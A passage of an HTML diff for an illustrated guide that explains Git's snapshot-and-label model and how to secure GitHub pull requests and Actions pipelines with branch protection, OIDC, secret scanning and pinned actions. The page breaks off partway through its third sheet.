+  <p class="thesis">Stops 01 to 04 of sheet 1, taken apart. Git looks like a pile of inconsistent commands and is really a small database of immutable snapshots with movable labels on top. <strong>Nothing in Git is ever edited — "rewriting history" means taking new snapshots and moving a label, which is why almost every mistake is recoverable.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 820" role="img" aria-label="Six panels on how Git works. A, the four places a change can be: working directory, staging area, local repository and remote, joined by add, commit and push. B, the object model: HEAD points at a branch file, which holds a commit hash; the commit points at a tree and a parent commit; the tree points at blobs. C, a commit graph with main at commit D and a feature branch of two commits leaving from C. D, merge versus rebase drawn as two graphs: a merge commit with two parents, and rebased commits E prime and F prime with the originals left unreachable. E, a decision tree for undoing things, split on whether anyone else has pulled the commit. F, git bisect halving a thousand commits, branch lifetime, and what to do with a committed secret.">
+        <defs>
+          <marker id="g1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+          <marker id="g2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--ink)"/></marker>
+        </defs>
+
+        <!-- PANEL A -->
+        <rect x="30" y="50" width="440" height="300" fill="var(--z2)"/>
+        <text x="46" y="74" class="s-zone" fill="var(--mute)">A · four places a change can be</text>
+        <g fill="var(--paper)" stroke="var(--rule)">
+          <rect x="46" y="90" width="190" height="44"/>
+          <rect x="46" y="156" width="190" height="44" stroke="var(--line)" stroke-width="2"/>
+          <rect x="46" y="222" width="190" height="44"/>
+          <rect x="46" y="288" width="190" height="44"/>
+        </g>
+        <g class="s-num"><text x="56" y="108">01</text><text x="56" y="174">02</text><text x="56" y="240">03</text><text x="56" y="306">04</text></g>
+        <g class="s-lab" font-size="11.5"><text x="80" y="108">working directory</text><text x="80" y="174">staging area (index)</text><text x="80" y="240">local repository</text><text x="80" y="306">remote</text></g>
+        <g class="s-sub" font-size="10.5"><text x="80" y="124">the files you edit</text><text x="80" y="190">what commit will hold</text><text x="80" y="256">every commit, offline</text><text x="80" y="322">GitHub · shared, protected</text></g>
+        <g stroke="var(--line)" stroke-width="2.5" fill="none" marker-end="url(#g1)">
+          <path d="M66,135 L66,152"/><path d="M66,201 L66,218"/><path d="M66,267 L66,284"/>
+        </g>
+        <g class="s-mono" font-size="10" style="fill:var(--line)"><text x="78" y="149">git add -p</text><text x="78" y="215">git commit</text><text x="78" y="281">git push · git fetch</text></g>
+
+        <text x="252" y="108" class="s-lab" font-size="11">Only 04 needs a network.</text>
+        <text x="252" y="124" class="s-sub" font-size="10.5">Commit, branch, diff, log, bisect —</text>
+        <text x="252" y="138" class="s-sub" font-size="10.5">local, and effectively instant.</text>
+        <text x="252" y="164" class="s-note" font-size="11">The index is the underrated one.</text>
+        <text x="252" y="180" class="s-sub" font-size="10.5">It lets you commit part of your</text>
+        <text x="252" y="194" class="s-sub" font-size="10.5">changes, which is what makes</text>
+        <text x="252" y="208" class="s-sub" font-size="10.5">small, coherent commits practical.</text>
+        <text x="252" y="234" class="s-haz" font-size="10.5">Never git pull on a production</text>
+        <text x="252" y="248" class="s-sub" font-size="10.5" style="fill:var(--hazard)">server. CI builds an artefact</text>
+        <text x="252" y="262" class="s-sub" font-size="10.5" style="fill:var(--hazard)">from what arrives at 04.</text>
+        <text x="252" y="290" class="s-num">15</text>
+        <text x="272" y="290" class="s-lab" font-size="11">in CI, clone shallow</text>
+        <text x="252" y="306" class="s-sub" font-size="10.5">--depth 1 removes minutes from a</text>
+        <text x="252" y="320" class="s-sub" font-size="10.5">long history; fetch more only for</text>
+        <text x="252" y="334" class="s-sub" font-size="10.5">the step that needs a changelog.</text>
+
+        <!-- PANEL B -->
+        <rect x="486" y="50" width="420" height="300" fill="var(--z3)"/>
+        <text x="502" y="74" class="s-zone" fill="var(--mute)">B · what is actually stored</text>
+        <rect x="502" y="92" width="64" height="30" fill="var(--paper)" stroke="var(--fast)" stroke-width="2"/>
+        <text x="534" y="111" text-anchor="middle" class="s-lab" font-size="11" style="fill:var(--fast)">HEAD</text>
+        <rect x="592" y="92" width="150" height="30" fill="var(--paper)" stroke="var(--line)" stroke-width="2"/>
+        <text x="602" y="111" class="s-mono" font-size="10">refs/heads/main</text>
+        <rect x="768" y="84" width="126" height="46" fill="var(--paper)" stroke="var(--line)" stroke-width="2.5"/>
+        <text x="778" y="102" class="s-lab" font-size="11">commit 9f2c1a</text>
+        <text x="778" y="120" class="s-mono" font-size="9.5" style="fill:var(--mute)">parent 4b7e02</text>
+        <rect x="592" y="150" width="150" height="40" fill="var(--paper)" stroke="var(--rule)"/>
+        <text x="602" y="168" class="s-lab" font-size="11">commit 4b7e02</text>
+        <text x="602" y="182" class="s-sub" font-size="10">the previous snapshot</text>
+        <rect x="768" y="150" width="126" height="40" fill="var(--paper)" stroke="var(--rule)"/>
+        <text x="778" y="168" class="s-lab" font-size="11">tree 1d40f3</text>
+        <text x="778" y="182" class="s-sub" font-size="10">a directory listing</text>
+        <rect x="704" y="216" width="92" height="40" fill="var(--paper)" stroke="var(--rule)"/>
+        <rect x="806" y="216" width="88" height="40" fill="var(--paper)" stroke="var(--rule)"/>
+        <text x="714" y="234" class="s-lab" font-size="11">blob a81c</text>
+        <text x="714" y="248" class="s-sub" font-size="10">src/app.ts</text>
+        <text x="816" y="234" class="s-lab" font-size="11">blob 55e0</text>
+        <text x="816" y="248" class="s-sub" font-size="10">README.md</text>
+        <g stroke="var(--line)" stroke-width="2" fill="none" marker-end="url(#g1)">
+          <path d="M566,107 L588,107"/><path d="M742,107 L764,107"/>
+          <path d="M770,126 L746,156"/><path d="M831,130 L831,146"/>
+          <path d="M818,190 L760,212"/><path d="M846,190 L850,212"/>
+        </g>
+        <g class="s-num"><text x="502" y="142">07 · labels</text><text x="870" y="78">06</text><text x="704" y="210">05</text></g>
+        <g class="s-mono" font-size="10">
+          <text x="502" y="276">blob    file contents — no name, no path</text>
+          <text x="502" y="290">tree    names → blobs and other trees</text>
+          <text x="502" y="304">commit  a tree + parent(s) + author + message</text>
+          <text x="502" y="318">branch  a file holding one commit hash</text>
+        </g>
+        <text x="502" y="338" class="s-note" font-size="11">Change one byte → a new hash → a new object.</text>
+
+        <!-- PANEL C -->
+        <rect x="922" y="50" width="448" height="300" fill="var(--z1)"/>
+        <text x="938" y="74" class="s-zone" fill="var(--line)">C · snapshots on a graph</text>
+        <text x="938" y="94" class="s-sub">git log --oneline --graph --all draws exactly this</text>
+        <path d="M960,150 L1170,150" stroke="var(--line)" stroke-width="4" fill="none"/>
+        <path d="M1100,150 C1130,150 1140,214 1170,214 L1240,214" stroke="var(--fast)" stroke-width="4" fill="none"/>
+        <g fill="var(--paper)" stroke="var(--line)" stroke-width="3"><circle cx="960" cy="150" r="11"/><circle cx="1030" cy="150" r="11"/><circle cx="1100" cy="150" r="11"/><circle cx="1170" cy="150" r="11"/></g>
+        <g fill="var(--paper)" stroke="var(--fast)" stroke-width="3"><circle cx="1170" cy="214" r="11"/><circle cx="1240" cy="214" r="11"/></g>
+        <g class="s-lab" font-size="11" text-anchor="middle"><text x="960" y="154">A</text><text x="1030" y="154">B</text><text x="1100" y="154">C</text><text x="1170" y="154">D</text><text x="1170" y="218">E</text><text x="1240" y="218">F</text></g>
+        <text x="1188" y="154" class="s-mono" font-size="10" style="fill:var(--line)">◄ main</text>
+        <text x="1258" y="210" class="s-mono" font-size="10" style="fill:var(--fast)">◄ feature/login</text>
+        <text x="1270" y="226" class="s-lab" font-size="10" style="fill:var(--fast)">HEAD</text>
+        <text x="938" y="258" class="s-sub">Commits are photographs already taken; nothing edits one.</text>
+        <text x="938" y="272" class="s-sub">"Rewriting history" is taking new photographs and moving the</text>
+        <text x="938" y="286" class="s-sub">label. The old ones sit in a drawer for weeks: that is reflog.</text>
+        <text x="938" y="312" class="s-note" font-size="11">Once branches are labels, rebase, reset and cherry-pick</text>
+        <text x="938" y="328" class="s-note" font-size="11">stop being incantations: where is the label, what is reachable?</text>
+
+        <!-- PANEL D -->
+        <rect x="30" y="370" width="660" height="270" fill="var(--z4)"/>
+        <text x="46" y="394" class="s-zone" fill="var(--mute)">D · merge versus rebase — same work, two histories</text>
+        <text x="46" y="420" class="s-num">08</text><text x="70" y="420" class="s-lab">merge</text>
+        <path d="M70,450 L320,450" stroke="var(--line)" stroke-width="3.5" fill="none"/>
+        <path d="M130,450 C155,450 165,500 190,500 L250,500 C285,500 295,450 320,450" stroke="var(--fast)" stroke-width="3.5" fill="none"/>
+        <g fill="var(--paper)" stroke="var(--line)" stroke-width="2.5"><circle cx="70" cy="450" r="9"/><circle cx="130" cy="450" r="9"/><circle cx="190" cy="450" r="9"/><circle cx="250" cy="450" r="9"/></g>
+        <g fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"><circle cx="190" cy="500" r="9"/><circle cx="250" cy="500" r="9"/></g>
+        <circle cx="320" cy="450" r="12" fill="var(--paper)" stroke="var(--ink)" stroke-width="3"/>
+        <g class="s-lab" font-size="10" text-anchor="middle"><text x="70" y="454">A</text><text x="130" y="454">B</text><text x="190" y="454">C</text><text x="250" y="454">D</text><text x="190" y="504">E</text><text x="250" y="504">F</text><text x="320" y="454">M</text></g>
+        <g class="s-sub" font-size="10.5"><text x="46" y="532">M is a merge commit with two parents</text><text x="46" y="546">never rewrites an existing commit</text><text x="46" y="560">safe on shared branches</text></g>
+
+        <text x="370" y="420" class="s-num">09</text><text x="394" y="420" class="s-lab">rebase</text>
+        <path d="M390,450 L660,450" stroke="var(--line)" stroke-width="3.5" fill="none"/>
+        <path d="M440,450 C465,450 470,500 495,500 L555,500" stroke="var(--mute)" stroke-width="2" stroke-dasharray="5 4" fill="none"/>
+        <g fill="var(--paper)" stroke="var(--line)" stroke-width="2.5"><circle cx="390" cy="450" r="9"/><circle cx="440" cy="450" r="9"/><circle cx="490" cy="450" r="9"/><circle cx="540" cy="450" r="9"/></g>
+        <g fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"><circle cx="600" cy="450" r="10"/><circle cx="660" cy="450" r="10"/></g>
+        <g fill="var(--paper)" stroke="var(--mute)" stroke-width="2" stroke-dasharray="4 3"><circle cx="495" cy="500" r="9"/><circle cx="555" cy="500" r="9"/></g>
+        <g class="s-lab" font-size="10" text-anchor="middle"><text x="390" y="454">A</text><text x="440" y="454">B</text><text x="490" y="454">C</text><text x="540" y="454">D</text><text x="600" y="454">E′</text><text x="660" y="454">F′</text><text x="495" y="504" fill="var(--mute)">E</text><text x="555" y="504" fill="var(--mute)">F</text></g>
+        <text x="574" y="504" class="s-sub" font-size="10">old E, F → reflog</text>
+        <g class="s-sub" font-size="10.5"><text x="370" y="532">replays your commits: NEW hashes</text><text x="370" y="546">linear and easy to read</text><text x="370" y="560">dangerous once someone built on it</text></g>
+
+        <text x="46" y="588" class="s-note" font-size="11">Rebase your own unpushed work · merge or squash into main · never rebase what others pulled</text>
+        <text x="46" y="610" class="s-num">10</text>
+        <text x="70" y="610" class="s-haz" font-size="10.5">push --force on a shared branch discards colleagues' commits.</text>
+        <text x="70" y="626" class="s-sub" font-size="10.5" style="fill:var(--hazard)">--force-with-lease refuses if the remote moved since your fetch. Block force pushes on main too.</text>
+
+        <!-- PANEL E -->
+        <rect x="706" y="370" width="664" height="270" fill="var(--band)"/>
+        <text x="722" y="394" class="s-zone" fill="var(--fast)">E · undo, without guessing</text>
+        <rect x="880" y="406" width="320" height="30" fill="var(--paper)" stroke="var(--ink)" stroke-width="2"/>
+        <text x="1040" y="425" text-anchor="middle" class="s-lab" font-size="11">has anyone else pulled this commit?</text>
+        <g stroke="var(--ink)" stroke-width="2" fill="none" marker-end="url(#g2)"><path d="M950,436 L920,454"/><path d="M1130,436 L1180,454"/></g>
+        <text x="926" y="452" text-anchor="end" class="s-lab" font-size="10.5" style="fill:var(--line)">no</text>
+        <text x="1164" y="452" text-anchor="end" class="s-lab" font-size="10.5" style="fill:var(--hazard)">yes</text>
+
+        <rect x="722" y="458" width="400" height="124" fill="var(--z1)" stroke="var(--line)" stroke-width="2"/>
+        <text x="734" y="478" class="s-lab" font-size="11" style="fill:var(--line)">no → rewriting is fine</text>
+        <g class="s-mono" font-size="10">
+          <text x="734" y="498">reword last commit</text><text x="900" y="498">commit --amend</text>
+          <text x="734" y="514">unstage a file</text><text x="900" y="514">restore --staged &lt;f&gt;</text>
+          <text x="734" y="530">discard file edits</text><text x="900" y="530">restore &lt;f&gt;</text>
+          <text x="734" y="546">undo commit, keep work</text><text x="900" y="546">reset --soft HEAD~1</text>
+          <text x="734" y="562" fill="var(--hazard)">undo commit, lose work</text><text x="900" y="562" fill="var(--hazard)">reset --hard HEAD~1 ⚠</text>
+        </g>
+
+        <rect x="1136" y="458" width="218" height="124" fill="var(--paper)" stroke="var(--hazard)" stroke-width="2"/>
+        <text x="1148" y="478" class="s-lab" font-size="11" style="fill:var(--hazard)">yes → only add commits</text>
+        <text x="1346" y="498" text-anchor="end" class="s-num">11</text>
+        <text x="1148" y="500" class="s-mono" font-size="10.5">git revert &lt;sha&gt;</text>
+        <text x="1148" y="518" class="s-sub" font-size="10.5">a NEW commit that undoes</text>
+        <text x="1148" y="532" class="s-sub" font-size="10.5">the old one — safe for</text>
+        <text x="1148" y="546" class="s-sub" font-size="10.5">everyone who pulled it</text>
+        <text x="1148" y="570" class="s-haz" font-size="10">reset here = team-wide confusion</text>
+
+        <rect x="722" y="594" width="632" height="34" fill="var(--paper)" stroke="var(--fast)" stroke-width="2"/>
+        <text x="734" y="615" class="s-num">12</text>
+        <text x="758" y="615" class="s-note" font-size="11">lost two commits after reset --hard?</text>
+        <text x="1016" y="615" class="s-mono" font-size="10.5">git reflog → git switch -c recovery &lt;sha&gt;</text>
+
+        <!-- PANEL F -->
+        <rect x="30" y="660" width="1340" height="150" fill="var(--z2)"/>
+        <text x="46" y="684" class="s-zone" fill="var(--mute)">F · three habits that pay back for years</text>
+
+        <text x="46" y="708" class="s-num">13</text>
+        <text x="70" y="708" class="s-lab" font-size="11">git bisect · find the commit that broke it</text>
+        <line x1="60" y1="740" x2="440" y2="740" stroke="var(--rule)" stroke-width="4"/>
+        <circle cx="60" cy="740" r="6" fill="var(--line)"/><circle cx="440" cy="740" r="6" fill="var(--hazard)"/>
+        <g fill="var(--fast)"><circle cx="250" cy="740" r="5"/><circle cx="155" cy="740" r="5"/><circle cx="202" cy="740" r="5"/><circle cx="226" cy="740" r="5"/></g>
+        <g class="s-num" font-size="9.5" text-anchor="middle"><text x="250" y="728">1</text><text x="155" y="728">2</text><text x="202" y="728">3</text><text x="226" y="728">4</text></g>
+        <g class="s-sub" font-size="10"><text x="52" y="760">good</text><text x="428" y="760">bad</text><text x="300" y="760">1,000 commits</text></g>
+        <text x="46" y="782" class="s-sub">each test halves the range: about 10 steps for 1,000 commits</text>
+        <text x="46" y="798" class="s-sub">— where debugging by hand takes an afternoon.</text>
+
+        <text x="500" y="708" class="s-num">14</text>
+        <text x="524" y="708" class="s-lab" font-size="11">branch lifetime, not branch naming</text>
+        <rect x="524" y="722" width="40" height="12" fill="var(--line)" opacity=".8"/>
+        <text x="572" y="732" class="s-sub" font-size="10">trunk-based: merged within a day or two</text>
+        <rect x="524" y="744" width="300" height="12" fill="var(--hazard)" opacity=".7"/>
+        <text x="832" y="754" class="s-sub" font-size="10">3 weeks</text>
+        <text x="500" y="780" class="s-sub">Divergence, not the workflow diagram, causes conflicts. If</text>
+        <text x="500" y="794" class="s-sub">merges hurt, shorten branches; flags hide unfinished work.</text>
+
+        <text x="950" y="708" class="s-num">16</text>
+        <text x="974" y="708" class="s-haz">a committed secret is already compromised</text>
+        <text x="950" y="728" class="s-sub">Deleting it in the next commit does nothing: it lives in</text>
+        <text x="950" y="742" class="s-sub">history, in every clone, fork and CI cache.</text>
+        <text x="950" y="762" class="s-lab" font-size="11">rotate first · then scrub with git-filter-repo</text>
+        <text x="950" y="780" class="s-sub">gitleaks as a pre-commit hook · .env in .gitignore from</text>
+        <text x="950" y="794" class="s-sub">the first commit · signed commits where provenance matters</text>
+      </svg>
+    </div>
+    <figcaption><b>The one question that resolves most Git confusion:</b> where is the label, and which snapshots can I still reach from it? Merge adds a snapshot with two parents; rebase takes new snapshots and moves the label; reset moves the label; revert adds a snapshot; reflog lists everywhere the label has been.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the parts of Git</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>Working directory</h4><p>The files as you are editing them. Nothing here is history yet; restore and switch move content back into it from the repository.</p></div>
+      <div><h4><span>02</span>Staging area</h4><p>The index: exactly what the next commit will contain. Beginners resent it, experienced users rely on it, because it lets one messy afternoon become three coherent commits.</p></div>
+      <div><h4><span>03</span>Local repository</h4><p>The complete object database and history, on your machine. It is why nearly every operation is fast and works offline, and why every clone is a full backup of history.</p></div>
+      <div><h4><span>04</span>Remote</h4><p>A shared copy — GitHub, GitLab, or a bare repository over SSH. CI is triggered by what arrives here. Branch protection is a platform feature, not a Git one.</p></div>
+      <div><h4><span>05</span>Blob and tree</h4><p>A blob is file contents with no name; a tree maps names to blobs and other trees. Identical files are stored once, because identical content has an identical hash.</p></div>
+      <div><h4><span>06</span>Commit</h4><p>A tree plus parent commits, author and message, identified by the hash of all of that. A snapshot, not a diff: Git computes differences only when you ask to see them.</p></div>
+      <div><h4><span>07</span>Branch and HEAD</h4><p>A branch is a file containing one commit hash; HEAD says which branch you are on. Committing writes a new snapshot and moves the label — which is why branches are free.</p></div>
+      <div><h4><span>08</span>Merge</h4><p>Joins two lines with a commit that has two parents. History shows what really happened, and no existing commit changes, so it is safe on any shared branch.</p></div>
+      <div><h4><span>09</span>Rebase</h4><p>Replays your commits onto a new base, creating new commits with new hashes. Linear and readable — and harmful the moment someone else has built on the originals.</p></div>
+      <div><h4><span>10</span>--force-with-lease</h4><p>A force push that refuses if the remote has moved since you last fetched — exactly the situation in which a plain <b>--force</b> silently discards other people's work.</p></div>
+      <div><h4><span>11</span>Reset versus revert</h4><p>Not alternatives. Reset moves a label and rewrites local history — fine for unpushed work. Revert adds a commit undoing an old one — the only safe option once others have pulled.</p></div>
+      <div><h4><span>12</span>Reflog</h4><p>Every position HEAD has held, kept for weeks. A bad reset, a lost commit after a rebase, a deleted branch: the commits still exist. Learn it on a calm afternoon, not during a panic.</p></div>
+      <div><h4><span>13</span>Bisect</h4><p>Binary search through history: mark a good and a bad commit, test the midpoints Git checks out. About ten steps across a thousand commits finds the change that broke it.</p></div>
+      <div><h4><span>14</span>Trunk-based development</h4><p>Short-lived branches merged within a day or two, main always deployable, unfinished work behind feature flags. Git Flow suits scheduled versioned releases, not a continuously deployed service.</p></div>
+      <div><h4><span>15</span>Shallow clone</h4><p><b>--depth 1</b> on a single branch is all most CI builds need. A full clone of a long-lived repository can dominate a fast pipeline's runtime.</p></div>
+      <div><h4><span>16</span>Committed secret</h4><p>Compromised the moment it is pushed. Rotate the credential first; scrubbing history is optional and second. Scan with gitleaks before a commit exists, and never commit .env.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>What Git is not</b>
+    <p>Not a place for secrets — history is permanent. Not a store for large binaries — every version is kept in full and every clone grows forever; use LFS or object storage. Not a deployment mechanism — build an artefact instead of pulling on a server. And not a backup of your machine: a repository is a history of what you chose to commit, nothing more.</p>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 3 — THE CHECKPOINT ══════════════════════ -->
+<div class="sheet" id="a3">
+  <div class="plate">
+    <span class="no">Sheet 3</span>
+    <h2>The Checkpoint</h2>
+    <span class="form">Floor plan</span>
+    <span class="cov">Covers · GitHub · GitHub Actions · CI CD</span>
+  </div>
+  <p class="thesis">Stops 05 to 12 of sheet 1, drawn as rooms and doors. Git manages history; GitHub manages the human process around it, and Actions runs code on every door. <strong>Each door is a rule, each rule has a bypass someone will ask for on a Friday night, and the pipeline behind them can deploy to production — which makes it one of the most valuable targets you own.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 870" role="img" aria-label="A floor plan of the route into main and into the cloud. A pushed branch passes a first door, push protection, into the pull request room, which holds the template, CODEOWNERS routing, a size rule and a workflow: read-only token, concurrency, three parallel jobs for lint, sharded tests and scanning, and a build job that needs all three. A second door, branch protection, leads to the main room with its seven merge rules. A third door, a required reviewer, leads to production, where an OIDC token is exchanged for a short-lived cloud role. Below, three traps: pull_request_target, mutable action tags and shell injection, and self-hosted runners. Along the bottom, a ranking of machine credentials and a chart of how caching and sharding take a pipeline from twenty minutes to five.">
+        <defs>
+          <marker id="c1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+        </defs>
+
+        <text x="30" y="40" class="s-zone" fill="var(--line)">The route into main, and into the cloud · every door is a rule, every rule has a bypass someone will ask for</text>
+
+        <!-- OUTSIDE -->
+        <rect x="30" y="60" width="160" height="330" fill="var(--z2)"/>
+        <text x="42" y="84" class="s-zone" fill="var(--mute)">Outside</text>
+        <text x="42" y="110" class="s-lab">a pushed branch</text>
+        <text x="42" y="128" class="s-sub" font-size="10.5">from a teammate —</text>
+        <text x="42" y="142" class="s-sub" font-size="10.5">or from a fork you</text>
+        <text x="42" y="156" class="s-sub" font-size="10.5">have never met</text>
+        <text x="42" y="190" class="s-num">08</text>
+        <text x="42" y="206" class="s-lab" font-size="11">push protection</text>
+        <text x="42" y="222" class="s-sub" font-size="10.5">secret scanning rejects</text>
+        <text x="42" y="236" class="s-sub" font-size="10.5">a recognisable key before</text>
+        <text x="42" y="250" class="s-sub" font-size="10.5">it enters history — no</text>
+        <text x="42" y="264" class="s-sub" font-size="10.5">rotate-and-scrub later</text>
+        <text x="42" y="300" class="s-haz" font-size="10.5">Defaults are</text>
+        <text x="42" y="314" class="s-haz" font-size="10.5">permissive.</text>
+        <text x="42" y="330" class="s-sub" font-size="10.5">Protection is opt-in.</text>
+
+        <!-- DOORS -->
+        <g fill="var(--ink)">
+          <rect x="196" y="60" width="10" height="130"/><rect x="196" y="240" width="10" height="150"/>
+          <rect x="882" y="60" width="10" height="130"/><rect x="882" y="240" width="10" height="150"/>
+          <rect x="1108" y="60" width="10" height="130"/><rect x="1108" y="240" width="10" height="150"/>
+        </g>
+        <g stroke="var(--line)" stroke-width="3" fill="none" marker-end="url(#c1)">
+          <path d="M184,215 L222,215"/><path d="M866,215 L906,215"/><path d="M1094,215 L1132,215"/>
+        </g>
+
+        <!-- PR ROOM -->
+        <rect x="214" y="60" width="664" height="330" fill="var(--z1)"/>
+        <text x="230" y="84" class="s-zone" fill="var(--line)">The pull request</text>
+        <text x="230" y="102" class="s-sub">the room every change must pass through before it can touch main</text>
+        <g fill="var(--paper)" stroke="var(--rule)">
+          <rect x="230" y="116" width="200" height="56"/><rect x="442" y="116" width="200" height="56"/><rect x="654" y="116" width="208" height="56"/>
+        </g>
+        <g class="s-num"><text x="240" y="134">01</text><text x="452" y="134">02</text><text x="664" y="134">03</text></g>
+        <g class="s-lab" font-size="11"><text x="262" y="134">PR template</text><text x="474" y="134">CODEOWNERS</text><text x="686" y="134">a reviewable size</text></g>
+        <g class="s-sub" font-size="10.5">
+          <text x="240" y="150">what changed · why ·</text><text x="240" y="164">how it was verified</text>
+          <text x="452" y="150">review routed by path:</text><text x="452" y="164">one owner plus a team</text>
+          <text x="664" y="150">50 lines: defects found.</text><text x="664" y="164">500 lines: skimmed, approved.</text>
+        </g>
+
+        <rect x="230" y="184" width="632" height="198" fill="var(--paper)" stroke="var(--rule)"/>
+        <text x="242" y="202" class="s-num">06</text>
+        <text x="264" y="202" class="s-mono" font-size="10">permissions: contents: read</text>
+        <text x="460" y="202" class="s-num">07</text>
+        <text x="482" y="202" class="s-mono" font-size="10">concurrency: cancel superseded runs</text>
+        <g fill="var(--z2)" stroke="var(--line)" stroke-width="2">
+          <rect x="246" y="214" width="170" height="54"/><rect x="430" y="214" width="200" height="54"/><rect x="644" y="214" width="202" height="54"/>
+        </g>
+        <g class="s-lab" font-size="11"><text x="256" y="234">lint · types</text><text x="440" y="234">test · 4 shards</text><text x="654" y="234">scan</text></g>
+        <g class="s-sub" font-size="10.5"><text x="256" y="252">30 s · fails first</text><text x="440" y="252">3 min · npm cache: 8 s, not 90</text><text x="654" y="252">1 min · trivy, gitleaks</text></g>
+        <rect x="430" y="300" width="200" height="54" fill="var(--z4)" stroke="var(--fast)" stroke-width="2.5"/>
+        <text x="440" y="320" class="s-lab" font-size="11">build · image:&lt;sha&gt;</text>
+        <text x="440" y="338" class="s-sub" font-size="10.5">only after needs: all green</text>
+        <g stroke="var(--line)" stroke-width="2" fill="none" marker-end="url(#c1)">
+          <path d="M331,268 L470,296"/><path d="M530,268 L530,296"/><path d="M745,268 L590,296"/>
+        </g>
+        <text x="246" y="318" class="s-num">05</text>
+        <g class="s-sub" font-size="10.5"><text x="268" y="318">needs: sequences</text><text x="268" y="332">jobs; they share files</text><text x="268" y="346">only via artifacts</text></g>
+        <g class="s-sub" font-size="10.5"><text x="644" y="318">10–30 s startup per job:</text><text x="644" y="332">a handful of jobs,</text><text x="644" y="346">not one, not thirty</text></g>
+        <text x="246" y="374" class="s-num">04</text>
+        <text x="268" y="374" class="s-sub" font-size="10.5">a fresh VM per job, nothing persists — so they fail independently, and fast</text>
+
+        <!-- MAIN ROOM -->
+        <rect x="898" y="60" width="204" height="330" fill="var(--z3)"/>
+        <text x="910" y="84" class="s-zone" fill="var(--mute)">Main</text>
+        <text x="1092" y="84" text-anchor="end" class="s-num">09</text>
+        <text x="910" y="104" class="s-sub" font-size="10.5">merge allowed only if:</text>
+        <g class="s-mono" font-size="10">
+          <text x="910" y="126">✓ a pull request</text>
+          <text x="910" y="142">✓ named checks pass</text>
+          <text x="910" y="158">✓ one approval</text>
+          <text x="910" y="174">✓ up to date with main</text>
+          <text x="910" y="190">✓ stale approvals dismissed</text>
+          <text x="910" y="206">✓ no force push, no delete</text>
+          <text x="910" y="222" fill="var(--hazard)">✓ includes administrators</text>
+        </g>
+        <text x="910" y="250" class="s-sub" font-size="10.5">then: squash merge, and</text>
+        <text x="910" y="264" class="s-sub" font-size="10.5">a release workflow pushes</text>
+        <text x="910" y="278" class="s-sub" font-size="10.5">image:&lt;sha&gt; to GHCR</text>
+        <text x="910" y="304" class="s-haz" font-size="10.5">An admin bypass on a</text>
+        <text x="910" y="318" class="s-haz" font-size="10.5">Friday night is exactly</text>
+        <text x="910" y="332" class="s-haz" font-size="10.5">when review mattered.</text>
+        <text x="910" y="356" class="s-sub" font-size="10.5">break-glass: logged, not silent</text>
+
+        <!-- PRODUCTION ROOM -->
+        <rect x="1124" y="60" width="246" height="330" fill="var(--z5)"/>
+        <text x="1136" y="84" class="s-zone" fill="var(--fast)">Production</text>
+        <text x="1360" y="84" text-anchor="end" class="s-num">10</text>
+        <text x="1136" y="106" class="s-lab" font-size="11">environment: production</text>
+        <text x="1136" y="122" class="s-sub" font-size="10.5">waits for a required reviewer</text>
+        <text x="1136" y="150" class="s-num">11</text>
+        <text x="1158" y="150" class="s-lab" font-size="11">OIDC — nothing stored</text>
+        <rect x="1136" y="160" width="222" height="58" fill="var(--paper)" stroke="var(--fast)" stroke-width="2"/>
+        <g class="s-mono" font-size="9.5"><text x="1146" y="178">trust: repo:org/name</text><text x="1146" y="194">  AND ref:refs/heads/main</text><text x="1146" y="210">→ a 1-hour role session</text></g>
+        <text x="1136" y="240" class="s-sub" font-size="10.5">A fork, another branch or a laptop</text>
+        <text x="1136" y="254" class="s-sub" font-size="10.5">cannot satisfy this trust policy.</text>
+        <text x="1136" y="268" class="s-sub" font-size="10.5">Nothing to leak, nothing to rotate.</text>
+        <text x="1136" y="300" class="s-note" font-size="10.5">A stored cloud key in secrets</text>
+        <text x="1136" y="314" class="s-note" font-size="10.5">can be read by any step, any</text>
+        <text x="1136" y="328" class="s-note" font-size="10.5">dependency, any third-party action.</text>
+        <text x="1136" y="356" class="s-sub" font-size="10.5">An afternoon to set up. See IAM.</text>
+
+        <!-- TRAPS -->
+        <rect x="30" y="420" width="440" height="222" fill="var(--band)"/>
+        <text x="46" y="444" class="s-zone" fill="var(--hazard)">12 · the pull_request_target trap</text>
+        <rect x="46" y="458" width="408" height="60" fill="var(--z1)" stroke="var(--line)"/>
+        <text x="58" y="478" class="s-mono">pull_request</text>
+        <text x="58" y="494" class="s-sub" font-size="10.5">runs the FORK's code · no secrets</text>
+        <text x="58" y="508" class="s-sub" font-size="10.5">read-only token → the safe default</text>
+        <rect x="46" y="528" width="408" height="60" fill="var(--z5)" stroke="var(--hazard)" stroke-width="2"/>
+        <text x="58" y="548" class="s-mono" style="fill:var(--hazard)">pull_request_target</text>
+        <text x="58" y="564" class="s-sub" font-size="10.5">runs YOUR base workflow WITH secrets</text>
+        <text x="58" y="578" class="s-sub" font-size="10.5">and a write token, for an untrusted PR</text>
+        <text x="46" y="610" class="s-haz" font-size="10.5">+ a checkout of the PR head = remote code execution.</text>
+        <text x="46" y="626" class="s-sub" font-size="10.5">Keep it to labels and comments; build fork code via workflow_run.</text>
+
+        <rect x="490" y="420" width="440" height="222" fill="var(--z3)"/>
+        <text x="506" y="444" class="s-zone" fill="var(--hazard)">13 · 14 · code you did not write</text>
+        <text x="506" y="470" class="s-mono" font-size="10.5" style="fill:var(--hazard)">uses: some-action@v3</text>
+        <text x="680" y="470" class="s-sub" font-size="10.5">a mutable tag — it can be moved</text>
+        <text x="506" y="492" class="s-mono" font-size="10.5" style="fill:var(--line)">uses: org/action@a1b2c3d…</text>
